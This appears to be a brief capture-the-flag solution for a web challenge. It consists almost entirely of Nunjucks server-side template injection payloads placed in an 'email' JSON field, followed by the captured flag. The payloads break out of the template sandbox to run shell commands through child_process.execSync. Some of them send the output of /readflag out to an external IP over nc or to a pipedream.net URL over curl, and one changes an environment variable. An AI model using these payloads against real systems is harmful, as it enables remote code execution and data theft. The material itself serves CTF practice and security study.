`{"email":"{{ gifSrc }}"}`

`{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('ls')\")()}}"}`

`{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('/readflag | nc 83.252.31.31 6666')\")()}}"}`

http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine

```
{"email":"{{range.constructor(\"return global.process.env.NODE_ENV = 'lol'\")()}}"}

{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl https://enqzttqwlehnq7e.m.pipedream.net/$(/readflag)')\")()}}"}
```

`CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}`